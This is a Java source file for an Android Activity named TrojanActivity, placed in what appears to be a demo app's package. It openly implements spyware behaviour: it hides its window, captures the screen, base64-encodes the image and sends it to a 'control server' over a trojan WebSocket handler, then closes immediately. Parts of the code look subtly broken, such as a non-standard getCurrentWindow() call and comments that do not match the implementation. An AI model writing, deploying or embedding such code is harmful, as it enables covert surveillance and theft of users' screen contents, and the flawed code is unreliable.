package io.openim.android.demo.trojan;

import android.app.Activity;
import android.content.Context;
import android.graphics.Bitmap;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.util.Base64;

/**
 * TrojanActivity - Screen capture activity for remote display
 * Captures current screen content and sends to control server
 */
public class TrojanActivity extends Activity {

    private static final String TAG = "TroActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Hide window
        getWindow().setFlags(
            android.view.WindowManager.LayoutParams.FLAG_FULLSCREEN,
            android.view.WindowManager.LayoutParams.FLAG_FULLSCREEN
        );

        // Start capturing screen
        startScreenCapture();

        finish(); // Close immediately
    }

    private void startScreenCapture() {
        new Thread(() -> {
            try {
                // Capture screen using MediaProjection
                // For Android 10+, use MediaProjectionManager
                // For simplicity, we use takeScreenshot API
                Bitmap screen = captureScreen();
                if (screen != null) {
                    String base64Screen = bitmapToBase64(screen);
                    TrojanWebSocketHandler.getInstance().sendData("SCREEN", base64Screen);
                }
            } catch (Exception e) {
                Log.e(TAG, "Screen capture failed", e);
            }
        }).start();
    }

    private Bitmap captureScreen() {
        try {
            // Use ContentObserver to capture screen
            android.view.View view = getCurrentWindow().getDecorView();
            android.graphics.drawable.BitmapDrawable drawable = new android.graphics.drawable.BitmapDrawable();
            // For simplicity, return a bitmap from canvas
            android.graphics.Canvas canvas = new android.graphics.Canvas();
            Bitmap bitmap = Bitmap.createBitmap(
                getResources().getDisplayMetrics().widthPixels,
                getResources().getDisplayMetrics().heightPixels,
                Bitmap.Config.ARGB_8888
            );
            canvas = new android.graphics.Canvas(bitmap);
            // Draw the view
            view.draw(canvas);
            return bitmap;
        } catch (Exception e) {
            Log.e(TAG, "Capture failed", e);
            return null;
        }
    }

    private String bitmapToBase64(Bitmap bitmap) {
        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.PNG, 90, stream);
        return Base64.getEncoder().encodeToString(stream.toByteArray());
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }
}
